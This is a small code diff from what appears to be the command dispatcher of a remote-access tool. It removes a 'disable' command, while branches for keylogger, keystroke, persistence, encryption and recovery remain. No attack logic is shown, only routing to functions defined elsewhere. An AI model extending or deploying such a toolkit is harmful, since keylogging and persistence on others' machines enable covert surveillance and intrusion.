@@ -8,7 +8,6 @@ from domestic.session.server_handling.download import *
 from domestic.session.server_handling.encrypt import *
 from domestic.session.server_handling.recover import *
 from domestic.session.server_handling.website import *
-from domestic.session.server_handling.disable import *
 from domestic.session.server_handling.upload import *
 from domestic.session.server_handling.system import *
 from domestic.session.server_handling.image import *
@@ -72,8 +71,6 @@ def command_validation(message):
       keylogger(message)
     elif low_message == 'keystroke':
       keystroke(message)
-    elif low_message == 'disable':
-      disable(message)
     elif low_message == 'persistence':
       persistence(message)
     elif low_message == 'system':
